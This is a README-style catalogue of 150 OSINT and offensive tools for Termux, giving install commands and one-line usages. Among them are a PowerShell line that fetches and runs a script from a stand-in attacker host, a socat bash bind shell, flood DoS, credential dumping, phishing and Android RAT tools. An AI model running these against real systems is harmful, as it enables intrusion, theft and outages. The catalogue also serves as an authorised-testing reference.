# BOJACK FEZZY 999 - 150+ OSINT & EXPLOITATION TOOLS



— Bojack (Chief Nap Officer, K9 Security Daemon)
```

## 📍 Location
**Ravensmead, Cape Town, South Africa**

## 👤 Author
**philfesters | Bojack Fezzy 999**

## 📧 Contact
**Email:** philfesters@gmail.com  
**GitHub:** https://github.com/philfesters  
**Profile:** https://philfesters.github.io

---

## 🎯 Philosophy

> **"Strategy Over Impulse. 999. Every tool here was compiled in Ravensmead, on a phone, in Termux, with Bojack sleeping nearby."**

---

## 📱 Platform Specifications

- **Device:** Honor X5b
- **OS:** Android 14
- **Environment:** Termux (Rootless)
- **Author:** philfesters | Bojack Fezzy 999
- **Brand:** Strategy Over Impulse (SOI)
- **GitHub:** github.com/philfesters
- **Tools Count:** 150 tools — 75 OSINT | 75 Exploitation
- **Categories:** Recon, OSINT, Web, Network, Exploit, Post-Exploit, Mobile, Cloud
- **Philosophy:** Strategy Over Impulse • 999 • No root needed

---

## 🚀 Quick Start

1. **Visit the profile:** [https://philfesters.github.io](https://philfesters.github.io)
2. **Download the full PDF documentation:** Contains detailed descriptions and use cases
3. **Install tools:** Use the commands below (tested on Android 14 in Termux)
4. **Start testing:** All for educational and authorized penetration testing only

---

## ⚠️ CRITICAL INSTALLATION NOTES

### Before Installing ANY Tools

1. **Update Termux packages:**
   ```bash
   pkg update && pkg upgrade -y
   ```

2. **Install essential dependencies:**
   ```bash
   pkg install python python-pip git golang rust nodejs -y
   ```

3. **The `--break-system-packages` flag:**
   - Required for `pip install` commands on newer Python versions
   - All pip commands in this guide include this flag
   - Example: `pip install tool_name --break-system-packages`

4. **Storage access (required for downloads):**
   ```bash
   termux-setup-storage
   ```

---

## 📚 TABLE OF CONTENTS

- [Recon & OSINT — Core (Tools 1-25)](#recon--osint--core-tools-1-25)
- [OSINT Advanced (Tools 26-50)](#osint-advanced-tools-26-50)
- [Forensics & Web Exploitation (Tools 51-75)](#forensics--web-exploitation-tools-51-75)
- [Network, MITM & Post-Exploitation (Tools 76-100)](#network-mitm--post-exploitation-tools-76-100)
- [AD, Mobile & Cloud Security (Tools 101-125)](#ad-mobile--cloud-security-tools-101-125)
- [Advanced, Pipelines & Code Analysis (Tools 126-150)](#advanced-pipelines--code-analysis-tools-126-150)

---

## RECON & OSINT — CORE (Tools 1-25)

### 001. Sherlock
**[Username OSINT]**  
Hunts usernames across 400+ social networks simultaneously.

```bash
git clone https://github.com/sherlock-project/sherlock
pip install -r sherlock/requirements.txt --break-system-packages
# USAGE: python3 sherlock/sherlock.py username
```

### 002. Recon-ng
**[Modular OSINT Framework]**  
Full-featured web reconnaissance framework with module system.

```bash
pkg install recon-ng -y
# USAGE: recon-ng
```

### 003. Amass
**[DNS & Subdomain Enumeration]**  
In-depth DNS enumeration and network mapping.

```bash
pkg install amass -y
# USAGE: amass enum -d target.com
```

### 004. Subfinder
**[Subdomain Discovery]**  
Fast passive subdomain enumeration using multiple sources.

```bash
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
# USAGE: subfinder -d target.com -o subs.txt
```

### 005. Assetfinder
**[Subdomain Discovery]**  
Finds domains and subdomains related to a target.

```bash
go install github.com/tomnomnom/assetfinder@latest
# USAGE: assetfinder domain.com
```

### 006. Httpx
**[HTTP Probing]**  
Fast HTTP/S prober that checks which URLs/IPs are live.

```bash
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
# USAGE: httpx -l urls.txt -title -status-code
```

### 007. Nuclei
**[Vulnerability Scanner]**  
Template-based vulnerability scanner with 5000+ community templates.

```bash
go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
# USAGE: nuclei -u https://target.com -t templates/
```

### 008. Dalfox
**[XSS Scanner]**  
Parameter analysis and XSS scanning tool.

```bash
go install github.com/hahwul/dalfox/v2@latest
# USAGE: dalfox url https://target.com/page?q=test
```

### 009. Arjun
**[HTTP Parameter Discovery]**  
Finds hidden HTTP parameters in web endpoints.

```bash
pip install arjun --break-system-packages
# USAGE: arjun -u https://target.com/endpoint
```

### 010. Dirsearch
**[Web Directory Bruteforce]**  
Web path scanner that discovers hidden directories and files.

```bash
pip install dirsearch --break-system-packages
# USAGE: dirsearch -u https://target.com
```

### 011. Nikto
**[Web Server Scanner]**  
Comprehensive web server vulnerability scanner.

```bash
pkg install nikto -y
# USAGE: nikto -h target.com
```

### 012. Whatweb
**[Web Technology Fingerprinting]**  
Identifies web technologies: CMS, frameworks, JavaScript libraries.

```bash
pkg install whatweb -y
# USAGE: whatweb target.com
```

### 013. Wapiti
**[Web Application Vulnerability Scanner]**  
Web application vulnerability scanner that crawls and tests.

```bash
pip install wapiti3 --break-system-packages
# USAGE: wapiti -u https://target.com
```

### 014. Ffuf
**[Web Fuzzer]**  
Fast web fuzzer written in Go.

```bash
go install github.com/ffuf/ffuf@latest
# USAGE: ffuf -w wordlist.txt -u https://target.com/FUZZ
```

### 015. Feroxbuster
**[Recursive Web Discovery]**  
Recursive content discovery tool written in Rust.

```bash
pkg install feroxbuster -y
# USAGE: feroxbuster -u https://target.com
```

### 016. Hakrawler
**[Web Crawler]**  
Simple, fast web crawler for gathering endpoints.

```bash
go install github.com/hakluke/hakrawler@latest
# USAGE: echo https://target.com | hakrawler
```

### 017. Katana
**[Next-Gen Web Crawler]**  
Advanced web crawler with headless browser modes.

```bash
go install github.com/projectdiscovery/katana/cmd/katana@latest
# USAGE: katana -u https://target.com
```

### 018. Gau
**[Historical URL Discovery]**  
GetAllUrls — fetches known URLs from multiple sources.

```bash
go install github.com/lc/gau/v2/cmd/gau@latest
# USAGE: gau domain.com
```

### 019. Waybackurls
**[Wayback Machine OSINT]**  
Fetches all URLs archived by the Wayback Machine.

```bash
go install github.com/tomnomnom/waybackurls@latest
# USAGE: waybackurls domain.com
```

### 020. Unfurl
**[URL Analysis]**  
Pulls specific components out of URLs at scale.

```bash
go install github.com/tomnomnom/unfurl@latest
# USAGE: cat urls.txt | unfurl keys
```

### 021. CeWL
**[Custom Wordlist Generator]**  
Spiders a website and generates custom wordlists.

```bash
gem install cewl
# USAGE: cewl https://target.com -d 2 -m 5 -w wordlist.txt
```

### 022. Photon
**[OSINT Web Crawler]**  
Incredibly fast OSINT web crawler.

```bash
git clone https://github.com/s0md3v/Photon
pip install -r Photon/requirements.txt --break-system-packages
# USAGE: python3 Photon/photon.py -u https://target.com
```

### 023. EyeWitness
**[Web Screenshot Tool]**  
Takes screenshots of web interfaces and services.

```bash
git clone https://github.com/FortyNorthSecurity/EyeWitness
# USAGE: python3 EyeWitness/Python/EyeWitness.py -f urls.txt
```

### 024. LinkFinder
**[JavaScript Endpoint Extractor]**  
Finds endpoints and parameters hidden in JavaScript files.

```bash
git clone https://github.com/GerbenJavado/LinkFinder
pip install -r LinkFinder/requirements.txt --break-system-packages
# USAGE: python3 LinkFinder/linkfinder.py -i https://target.com/app.js -o cli
```

### 025. theHarvester
**[Email & Domain OSINT]**  
Gathers emails, subdomains, hosts from public sources.

```bash
pip install theHarvester --break-system-packages
# USAGE: theHarvester -d target.com -b google,linkedin,shodan
```

---

## OSINT ADVANCED (Tools 26-50)

### 026. Maltego CE
**[Visual OSINT & Link Analysis]**  
Graphical link-analysis tool for OSINT.

```bash
# Download from maltego.com (free CE version)
# USAGE: maltego
```

### 027. SpiderFoot
**[Automated OSINT]**  
Automated OSINT collection tool with 200+ modules.

```bash
pip install spiderfoot --break-system-packages
# USAGE: sf.py -l 127.0.0.1:5001
```

### 028. Shodan CLI
**[Internet Device Search]**  
CLI for Shodan — the search engine for internet-connected devices.

```bash
pip install shodan --break-system-packages
# USAGE: shodan search 'apache country:ZA'
```

### 029. Nmap
**[Network Scanner]**  
The legendary network mapper.

```bash
pkg install nmap -y
# USAGE: nmap -sV -sC -O target.com
```

### 030. Masscan
**[Fast Port Scanner]**  
World's fastest port scanner.

```bash
pkg install masscan -y
# USAGE: masscan -p1-65535 target.com --rate=1000
```

### 031. DNSx
**[DNS Toolkit]**  
Fast DNS resolver and toolkit.

```bash
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
# USAGE: dnsx -l subdomains.txt -a -resp
```

### 032. MassDNS
**[High-Performance DNS Resolver]**  
Ultra-fast DNS stub resolver.

```bash
git clone https://github.com/blechschmidt/massdns
cd massdns && make
# USAGE: ./massdns -r resolvers.txt -t A wordlist.txt
```

### 033. Gobuster
**[Directory & DNS Brute Forcer]**  
Directory/file brute forcer and DNS subdomain enumerator.

```bash
pkg install gobuster -y
# USAGE: gobuster dir -u https://target.com -w wordlist.txt
```

### 034. Wfuzz
**[Web Fuzzer]**  
Web application fuzzer for discovering resources.

```bash
pip install wfuzz --break-system-packages
# USAGE: wfuzz -c -z file,wordlist.txt https://target.com/FUZZ
```

### 035. SQLMap
**[SQL Injection Scanner]**  
Automated SQL injection and database takeover tool.

```bash
git clone https://github.com/sqlmapproject/sqlmap
# USAGE: python3 sqlmap/sqlmap.py -u 'https://target.com/page?id=1' --dbs
```

### 036. XSStrike
**[XSS Detection Suite]**  
Advanced XSS detection suite with fuzzer.

```bash
git clone https://github.com/s0md3v/XSStrike
pip install -r XSStrike/requirements.txt --break-system-packages
# USAGE: python3 XSStrike/xsstrike.py -u 'https://target.com?q=test'
```

### 037. Commix
**[Command Injection Scanner]**  
Automated command injection and exploitation tool.

```bash
git clone https://github.com/commixproject/commix
# USAGE: python3 commix/commix.py -u 'https://target.com?name=test'
```

### 038. Tplmap
**[Server-Side Template Injection]**  
Automates detection and exploitation of SSTI vulnerabilities.

```bash
git clone https://github.com/epinna/tplmap
# USAGE: python3 tplmap/tplmap.py -u 'https://target.com?name=test'
```

### 039. WPScan
**[WordPress Scanner]**  
WordPress vulnerability scanner.

```bash
gem install wpscan
# USAGE: wpscan --url https://target.com --enumerate vp,u
```

### 040. Droopescan
**[Drupal/CMS Scanner]**  
Plugin-based CMS scanner.

```bash
pip install droopescan --break-system-packages
# USAGE: droopescan scan drupal -u https://target.com
```

### 041. JoomScan
**[Joomla Scanner]**  
OWASP Joomla vulnerability scanner.

```bash
git clone https://github.com/OWASP/joomscan
# USAGE: perl joomscan/joomscan.pl -u https://target.com
```

### 042. CMSeeK
**[CMS Detection & Exploitation]**  
CMS detection and exploitation suite.

```bash
git clone https://github.com/Tuhinshubhra/CMSeeK
pip install -r CMSeeK/requirements.txt --break-system-packages
# USAGE: python3 CMSeeK/cmseek.py -u https://target.com
```

### 043. GitDorker
**[GitHub OSINT]**  
Automated GitHub dorking tool.

```bash
git clone https://github.com/obheda12/GitDorker
# USAGE: python3 GitDorker/gitdorker.py -tf tokens.txt -q target.com -d dorks.txt
```

### 044. TruffleHog
**[Secret Scanner]**  
Searches git repositories for exposed secrets.

```bash
pip install truffleHog --break-system-packages
# USAGE: truffleHog --regex --entropy=False https://github.com/target/repo
```

### 045. Gitleaks
**[Secret Scanner]**  
Detects secrets and sensitive info in git repos.

```bash
go install github.com/zricethezav/gitleaks/v8@latest
# USAGE: gitleaks detect --source /path/to/repo
```

### 046. Censys CLI
**[Internet Asset Search]**  
CLI for the Censys internet-scanning platform.

```bash
pip install censys --break-system-packages
# USAGE: censys search 'services.port=80 and ip: 192.168.1.0/24'
```

### 047. Holehe
**[Email OSINT]**  
Checks if an email is associated with accounts on 120+ platforms.

```bash
pip install holehe --break-system-packages
# USAGE: holehe target@email.com
```

### 048. Maigret
**[Username OSINT]**  
Username OSINT collector that checks 3000+ sites.

```bash
pip install maigret --break-system-packages
# USAGE: maigret username
```

### 049. Osintgram
**[Instagram OSINT]**  
OSINT tool for Instagram.

```bash
git clone https://github.com/Datalux/Osintgram
# USAGE: python3 Osintgram/main.py target_username
```

### 050. Instaloader
**[Instagram Downloader & OSINT]**  
Downloads Instagram profiles, posts, stories, and metadata.

```bash
pip install instaloader --break-system-packages
# USAGE: instaloader @target_username
```

---

## FORENSICS & WEB EXPLOITATION (Tools 51-75)

### 051. Exiftool
**[Metadata Extraction]**  
Reads and writes metadata in files.

```bash
pkg install perl -y
cpan Image::ExifTool
# USAGE: exiftool image.jpg
```

### 052. Metagoofil
**[Document Metadata OSINT]**  
Extracts metadata from public documents.

```bash
git clone https://github.com/laramies/metagoofil
# USAGE: python3 metagoofil/metagoofil.py -d target.com -t pdf -l 10
```

### 053. Wireshark/tshark
**[Packet Capture & Analysis]**  
Industry-standard packet analyser.

```bash
pkg install tshark -y
# USAGE: tshark -i wlan0 -w capture.pcap
```

### 054. Tcpdump
**[Packet Capture]**  
Lightweight command-line packet analyser.

```bash
pkg install tcpdump -y
# USAGE: tcpdump -i wlan0 -w output.pcap host target.com
```

### 055. Volatility 3
**[Memory Forensics]**  
Memory forensics framework for analysing RAM dumps.

```bash
pip install volatility3 --break-system-packages
# USAGE: vol -f memdump.raw windows.pslist
```

### 056. Binwalk
**[Firmware Analysis]**  
Firmware analysis and extraction tool.

```bash
pkg install binwalk -y
# USAGE: binwalk -e firmware.bin
```

### 057. Steghide
**[Steganography]**  
Steganography tool for hiding and extracting data.

```bash
pkg install steghide -y
# USAGE: steghide extract -sf image.jpg
```

### 058. Foremost
**[File Carving]**  
Forensic file carving tool.

```bash
pkg install foremost -y
# USAGE: foremost -i disk.img -o output/
```

### 059. Radare2
**[Reverse Engineering]**  
Open-source reverse engineering framework.

```bash
pkg install radare2 -y
# USAGE: r2 -A binary
```

### 060. GDB
**[Debugger]**  
GNU debugger — standard debugger for C/C++.

```bash
pkg install gdb -y
# USAGE: gdb ./binary
```

### 061. Yara
**[Malware Pattern Matching]**  
Pattern matching tool for malware analysis.

```bash
pkg install yara -y
# USAGE: yara rules.yar /path/to/scan/
```

### 062. Strings
**[Binary String Extraction]**  
Extracts printable strings from binary files.

```bash
pkg install binutils -y
# USAGE: strings binary | grep -i password
```

### 063. xxd
**[Hex Dump]**  
Creates hex dumps of binary files.

```bash
pkg install vim -y
# USAGE: xxd file.bin | head -50
```

### 064. Hashcat
**[Password Cracking]**  
World's fastest password cracker.

```bash
pkg install hashcat -y
# USAGE: hashcat -m 0 hash.txt /sdcard/wordlist.txt
```

### 065. John the Ripper
**[Password Cracking]**  
Classic password cracker.

```bash
pkg install john -y
# USAGE: john --wordlist=/sdcard/rockyou.txt hash.txt
```

### 066. Hydra
**[Online Brute Force]**  
Fast network login cracker.

```bash
pkg install hydra -y
# USAGE: hydra -l admin -P wordlist.txt ssh://target.com
```

### 067. Medusa
**[Online Brute Force]**  
Parallel network login brute forcer.

```bash
pkg install medusa -y
# USAGE: medusa -h target.com -u admin -P wordlist.txt -M ssh
```

### 068. Crunch
**[Wordlist Generator]**  
Custom wordlist generator.

```bash
pkg install crunch -y
# USAGE: crunch 6 10 abc123 -o wordlist.txt
```

### 069. Cupp
**[Targeted Wordlist Generator]**  
Common User Passwords Profiler.

```bash
git clone https://github.com/Mebus/cupp
# USAGE: python3 cupp/cupp.py -i
```

### 070. Metasploit
**[Exploitation Framework]**  
The world's most used penetration testing framework.

```bash
pkg install metasploit-framework -y
# USAGE: msfconsole
```

### 071. RouterSploit
**[Router Exploitation]**  
Exploitation framework for embedded devices and routers.

```bash
git clone https://github.com/threat9/routersploit
pip install -r routersploit/requirements.txt --break-system-packages
# USAGE: python3 routersploit/rsf.py
```

### 072. Searchsploit
**[Exploit Database]**  
CLI for the Exploit-DB database.

```bash
pkg install exploitdb -y
# USAGE: searchsploit apache 2.4
```

### 073. BeEF Framework
**[Browser Exploitation]**  
Browser Exploitation Framework.

```bash
git clone https://github.com/beefproject/beef
# USAGE: cd beef && ./beef
```

### 074. Social Engineering Toolkit (SET)
**[Social Engineering]**  
Industry standard for social engineering attacks.

```bash
git clone https://github.com/trustedsec/social-engineer-toolkit
# USAGE: python3 setoolkit
```

### 075. HiddenEye
**[Phishing Framework]**  
Phishing attack tool with 30+ cloned login pages.

```bash
git clone https://github.com/DarkSecDevelopers/HiddenEye-Legacy
# USAGE: python3 HiddenEye/HiddenEye.py
```

---

## NETWORK, MITM & POST-EXPLOITATION (Tools 76-100)

### 076. SocialFish
**[Phishing Framework]**  
Social media phishing tool.

```bash
git clone https://github.com/UndeadSec/SocialFish
# USAGE: python3 SocialFish/SocialFish.py
```

### 077. Bettercap
**[Network MITM & Attacks]**  
Complete MITM framework.

```bash
pkg install bettercap -y
# USAGE: bettercap -iface wlan0
```

### 078. Ettercap
**[Network MITM]**  
Classic MITM attack tool.

```bash
pkg install ettercap -y
# USAGE: ettercap -T -M arp:remote /target1// /target2//
```

### 079. Aircrack-ng
**[WiFi Security Testing]**  
Complete WiFi security auditing suite.

```bash
pkg install aircrack-ng -y
# USAGE: aircrack-ng -w wordlist.txt capture.cap
```

### 080. Reaver
**[WPS PIN Attack]**  
WPS PIN brute force tool.

```bash
pkg install reaver -y
# USAGE: reaver -i wlan0mon -b [BSSID] -vv
```

### 081. Kismet
**[Wireless Detection]**  
Wireless network detector, sniffer, and IDS.

```bash
pkg install kismet -y
# USAGE: kismet -c wlan0
```

### 082. Hping3
**[Packet Crafting & DoS Testing]**  
TCP/IP packet assembler and analyser.

```bash
pkg install hping3 -y
# USAGE: hping3 -S --flood -p 80 target.com
```

### 083. Slowloris
**[DoS Testing]**  
HTTP DoS tool.

```bash
pip install slowloris --break-system-packages
# USAGE: slowloris target.com -p 80
```

### 084. Snort
**[Intrusion Detection/Prevention]**  
Network intrusion detection system.

```bash
pkg install snort -y
# USAGE: snort -c /etc/snort/snort.conf -i wlan0
```

### 085. Tcpflow
**[TCP Stream Capture]**  
Captures data transmitted over TCP connections.

```bash
pkg install tcpflow -y
# USAGE: tcpflow -r capture.pcap
```

### 086. Netcat
**[Networking Swiss Army Knife]**  
Port scanning, file transfer, reverse shells.

```bash
pkg install netcat-openbsd -y
# USAGE: nc -lvnp 4444
```

### 087. Socat
**[Advanced Relay Tool]**  
Multipurpose relay for bidirectional data transfer.

```bash
pkg install socat -y
# USAGE: socat TCP-LISTEN:4444,fork EXEC:/bin/bash
```

### 088. Proxychains
**[Traffic Routing]**  
Forces TCP connections through proxies.

```bash
pkg install proxychains-ng -y
# USAGE: proxychains nmap target.com
```

### 089. Tor
**[Anonymity Network]**  
Routes traffic through the Tor anonymity network.

```bash
pkg install tor -y
# USAGE: tor & then proxychains tool
```

### 090. OpenSSL
**[SSL/TLS Testing]**  
Comprehensive SSL/TLS toolkit.

```bash
pkg install openssl -y
# USAGE: openssl s_client -connect target.com:443
```

### 091. SSLyze
**[SSL/TLS Scanner]**  
Fast SSL/TLS scanning library and CLI.

```bash
pip install sslyze --break-system-packages
# USAGE: sslyze target.com
```

### 092. TestSSL.sh
**[SSL/TLS Testing]**  
Checks SSL/TLS implementation for vulnerabilities.

```bash
git clone https://github.com/drwetter/testssl.sh
# USAGE: bash testssl.sh/testssl.sh target.com
```

### 093. Exploit-DB searchsploit
**[CVE & Exploit Research]**  
Local database of public exploits.

```bash
pkg install exploitdb -y
# USAGE: searchsploit 'WordPress 5.8' --www
```

### 094. Empire
**[Post-Exploitation Framework]**  
Pure PowerShell/Python post-exploitation framework.

```bash
git clone https://github.com/BC-SECURITY/Empire
cd Empire && ./setup/install.sh && python3 empire.py
# USAGE: python3 empire.py
```

### 095. Sliver
**[C2 Framework]**  
Modern open-source C2 framework.

```bash
curl https://sliver.sh/install | bash
# USAGE: ./sliver-server
```

### 096. Mimikatz (via meterpreter)
**[Credential Dumping]**  
Tool for extracting credentials from Windows memory.

```bash
# Use via Metasploit meterpreter session
# USAGE: meterpreter> load kiwi then: creds_all
```

### 097. Pupy
**[RAT & Post-Exploitation]**  
Cross-platform remote administration tool.

```bash
git clone https://github.com/n1nj4sec/pupy
# USAGE: python3 pupy/pupysh.py
```

### 098. PowerSploit
**[PowerShell Exploitation]**  
Collection of PowerShell modules for offensive security.

```bash
git clone https://github.com/PowerShellMafia/PowerSploit
# USAGE: IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerSploit/module.ps1')
```

### 099. BloodHound
**[Active Directory Mapping]**  
Active Directory privilege escalation mapper.

```bash
# Download from github.com/BloodHoundAD/BloodHound
# USAGE: bloodhound
```

### 100. Impacket
**[Network Protocol Attacks]**  
Python library implementing network protocols for offensive use.

```bash
pip install impacket --break-system-packages
# USAGE: python3 impacket/examples/secretsdump.py domain/user:pass@target
```

---

## AD, MOBILE & CLOUD SECURITY (Tools 101-125)

### 101. Responder
**[LLMNR/NBNS Poisoning]**  
LLMNR, NBT-NS, and MDNS poisoner.

```bash
git clone https://github.com/lgandx/Responder
# USAGE: python3 Responder/Responder.py -I wlan0 -rdw
```

### 102. CrackMapExec
**[Network Protocol & AD Auditing]**  
Swiss army knife for Windows/AD environments.

```bash
pip install crackmapexec --break-system-packages
# USAGE: crackmapexec smb 192.168.1.0/24 -u admin -p password
```

### 103. Enum4linux
**[SMB/Windows Enumeration]**  
Enumerates information from Windows and Samba systems.

```bash
pkg install enum4linux -y
# USAGE: enum4linux -a target.com
```

### 104. Smbmap
**[SMB Share Enumeration]**  
SMB enumeration tool.

```bash
pip install smbmap --break-system-packages
# USAGE: smbmap -H target.com -u guest
```

### 105. Ldapdomaindump
**[LDAP/AD Enumeration]**  
Dumps Active Directory data via LDAP.

```bash
pip install ldapdomaindump --break-system-packages
# USAGE: ldapdomaindump ldap://dc.target.com -u 'domain\user' -p pass
```

### 106. Kerbrute
**[Kerberos Enumeration]**  
Enumerates valid usernames in Active Directory.

```bash
go install github.com/ropnop/kerbrute@latest
# USAGE: kerbrute userenum -d domain.com userlist.txt
```

### 107. Ligolo-ng
**[Tunneling & Pivoting]**  
Advanced tunneling tool for pivoting.

```bash
go install github.com/nicocha30/ligolo-ng/cmd/proxy@latest
# USAGE: proxy -selfcert -laddr 0.0.0.0:11601
```

### 108. Chisel
**[TCP Tunneling]**  
Fast TCP/UDP tunnel transported over HTTP.

```bash
go install github.com/jpillora/chisel@latest
# USAGE: chisel server --port 8080 --reverse
```

### 109. Pwncat
**[Post-Exploitation Shell]**  
Post-exploitation tool that catches reverse shells.

```bash
pip install pwncat-cs --break-system-packages
# USAGE: pwncat-cs -lp 4444
```

### 110. LinPEAS
**[Linux Privilege Escalation]**  
Linux Privilege Escalation Awesome Script.

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
# USAGE: bash linpeas.sh
```

### 111. GTFOBins reference
**[Living Off The Land]**  
Curated list of Unix binaries for privilege escalation.

```bash
# curl -s gtfobins.github.io (reference site)
# USAGE: curl 'https://gtfobins.github.io/gtfobins/vim/' | grep sudo
```

### 112. Pspy
**[Process Monitoring]**  
Monitors Linux processes without root privileges.

```bash
# Download binary from github.com/DominicBreuker/pspy/releases
# USAGE: ./pspy64
```

### 113. Dirb
**[Web Directory Brute Force]**  
Web content scanner.

```bash
pkg install dirb -y
# USAGE: dirb https://target.com /usr/share/dirb/wordlists/common.txt
```

### 114. Burp Suite (Community)
**[Web Proxy & Scanner]**  
Industry standard web application testing platform.

```bash
# Download from portswigger.net (Java-based)
# USAGE: java -jar burpsuite_community.jar
```

### 115. Caido
**[Modern Web Proxy]**  
Modern web security testing proxy.

```bash
# Download from caido.io
# USAGE: caido
```

### 116. Corsy
**[CORS Misconfiguration Scanner]**  
CORS misconfiguration scanner.

```bash
git clone https://github.com/s0md3v/Corsy
pip install -r Corsy/requirements.txt --break-system-packages
# USAGE: python3 Corsy/corsy.py -u https://target.com
```

### 117. SSRF-Sheriff
**[SSRF Detection]**  
SSRF detection tool.

```bash
go install github.com/teknogeek/ssrf-sheriff@latest
# USAGE: ssrf-sheriff -listen :8080
```

### 118. Interactsh
**[Out-of-Band Detection]**  
Out-of-band interaction tool.

```bash
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
# USAGE: interactsh-client
```

### 119. Dnspy / JADX
**[Mobile App Analysis]**  
Decompile Android APK files.

```bash
pip install jadx-wrapper --break-system-packages
# USAGE: jadx app.apk -d output/
```

### 120. Apktool
**[APK Reverse Engineering]**  
Decodes APK files back to near-original form.

```bash
pkg install apktool -y
# USAGE: apktool d app.apk -o output/
```

### 121. MobSF
**[Mobile Security Framework]**  
Automated mobile app security testing framework.

```bash
git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF
cd MobSF && bash setup.sh && bash run.sh 0.0.0.0:8000
# USAGE: Access web UI at http://127.0.0.1:8000
```

### 122. Androbugs
**[Android Vulnerability Scanner]**  
Android app vulnerability scanner.

```bash
git clone https://github.com/AndroBugs/AndroBugs_Framework
# USAGE: python3 androbugs.py -f app.apk
```

### 123. Frida
**[Dynamic Instrumentation]**  
Dynamic instrumentation toolkit.

```bash
pip install frida-tools --break-system-packages
# USAGE: frida -U -n com.target.app -l hook.js
```

### 124. Objection
**[Mobile Runtime Analysis]**  
Runtime mobile exploration toolkit built on Frida.

```bash
pip install objection --break-system-packages
# USAGE: objection -g com.target.app explore
```

### 125. Subfinder + Httpx + Nuclei (Pipeline)
**[Automated Recon Pipeline]**  
The killer combo for automated reconnaissance.

```bash
# Install all three separately (see entries 4, 6, 7)
# USAGE: subfinder -d target.com | httpx -silent | nuclei -t templates/
```

---

## ADVANCED, PIPELINES & CODE ANALYSIS (Tools 126-150)

### 126. GhostFramework
**[Offensive Framework]**  
Offensive security framework.

```bash
git clone https://github.com/entynetproject/ghost
# USAGE: python3 ghost/ghost.py
```

### 127. Mdk4
**[WiFi Jamming & DoS]**  
WiFi deauthentication and DoS tool.

```bash
pkg install mdk4 -y
# USAGE: mdk4 wlan0mon d -b blacklist.txt
```

### 128. Wifite2
**[Automated WiFi Auditing]**  
Automated WiFi auditing tool.

```bash
pip install wifite2 --break-system-packages
# USAGE: wifite
```

### 129. AhMyth RAT
**[Android RAT]**  
Android Remote Administration Tool.

```bash
git clone https://github.com/AhMyth/AhMyth-Android-RAT
cd AhMyth && npm install && npm start
# USAGE: Access web UI
```

### 130. Kali NetHunter (concept)
**[Android Pentesting Platform]**  
Full Kali Linux environment for Android.

```bash
# Requires rooted device — not applicable to Termux setup
# USAGE: nethunter
```

### 131. Wigle.net CLI
**[WiFi OSINT]**  
CLI for WiGLE — global WiFi network database.

```bash
pip install wigle --break-system-packages
# USAGE: wigle search --ssid 'TargetNetwork'
```

### 132. LaZagne
**[Credential Recovery]**  
Credential recovery tool for local machines.

```bash
git clone https://github.com/AlessandroZ/LaZagne
# USAGE: python3 laZagne/laZagne.py all
```

### 133. Gitjacker
**[Exposed .git Exploitation]**  
Detects and exploits exposed .git directories.

```bash
go install github.com/liamg/gitjacker@latest
# USAGE: gitjacker https://target.com
```

### 134. Git-dumper
**[Exposed .git Exploitation]**  
Dumps a git repository from misconfigured servers.

```bash
pip install git-dumper --break-system-packages
# USAGE: git-dumper https://target.com/.git/ output/
```

### 135. S3Scanner
**[Cloud Storage OSINT]**  
Scans S3 buckets for public access misconfigurations.

```bash
pip install s3scanner --break-system-packages
# USAGE: s3scanner scan --bucket target-bucket-name
```

### 136. CloudMapper
**[Cloud Infrastructure Mapping]**  
AWS environment visualisation tool.

```bash
git clone https://github.com/duo-labs/cloudmapper
pip install -r cloudmapper/requirements.txt --break-system-packages
# USAGE: python3 cloudmapper/cloudmapper.py collect --account myaccount
```

### 137. Pacu
**[AWS Exploitation Framework]**  
AWS exploitation framework for red team operations.

```bash
pip install pacu --break-system-packages
# USAGE: pacu
```

### 138. Semgrep
**[Static Code Analysis]**  
Fast, open-source static analysis tool.

```bash
pip install semgrep --break-system-packages
# USAGE: semgrep --config auto /path/to/code
```

### 139. Graudit
**[Source Code Auditing]**  
Simple source code auditing using grep patterns.

```bash
git clone https://github.com/wireghoul/graudit
# USAGE: bash graudit/graudit.py -d php -s /path/to/code
```

### 140. Retire.js
**[JavaScript Vulnerability Scanner]**  
Scans JavaScript files for known vulnerabilities.

```bash
npm install -g retire
# USAGE: retire --path /path/to/webapp
```

### 141. OSV-Scanner
**[Dependency Vulnerability Scanner]**  
Google's open-source vulnerability scanner.

```bash
go install github.com/google/osv-scanner/cmd/osv-scanner@latest
# USAGE: osv-scanner -r /path/to/project
```

### 142. Prowler
**[Cloud Security Assessment]**  
Open-source cloud security tool.

```bash
pip install prowler --break-system-packages
# USAGE: prowler aws
```

### 143. Metabigor
**[OSINT Without API Keys]**  
OSINT tool that works without API keys.

```bash
go install github.com/j3ssie/metabigor@latest
# USAGE: echo 'target.com' | metabigor net -o /tmp/results.txt
```

### 144. Chaos Client
**[Bug Bounty Asset Discovery]**  
CLI client for ProjectDiscovery's Chaos dataset.

```bash
go install github.com/projectdiscovery/chaos-client/cmd/chaos@latest
# USAGE: chaos -d target.com -o subs.txt
```

### 145. Naabu
**[Port Scanner]**  
Fast SYN-based port scanner.

```bash
go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
# USAGE: naabu -host target.com -p -
```

### 146. Fingerprintx
**[Service Fingerprinting]**  
Standalone utility for service fingerprinting.

```bash
go install github.com/praetorian-inc/fingerprintx/cmd/fingerprintx@latest
# USAGE: fingerprintx -t target.com:22
```

### 147. Ppmap
**[Prototype Pollution Scanner]**  
Scanner for JavaScript prototype pollution vulnerabilities.

```bash
go install github.com/kleiton0x00/ppmap@latest
# USAGE: ppmap -u https://target.com
```

### 148. GraphQLmap
**[GraphQL Security Testing]**  
GraphQL endpoint exploitation tool.

```bash
git clone https://github.com/swisskyrepo/GraphQLmap
# USAGE: python3 GraphQLmap/graphqlmap.py -u https://target.com/graphql
```

### 149. Postman (CLI/Newman)
**[API Testing]**  
API testing framework.

```bash
npm install -g newman
# USAGE: newman run collection.json -e environment.json
```

### 150. Hayabusa
**[Windows Event Log Analysis]**  
Fast Windows event log parser.

```bash
# Download binary from github.com/Yamato-Security/hayabusa/releases
# USAGE: ./hayabusa csv-timeline -d /logs -o timeline.csv
```

---

## ⚠️ LEGAL DISCLAIMER

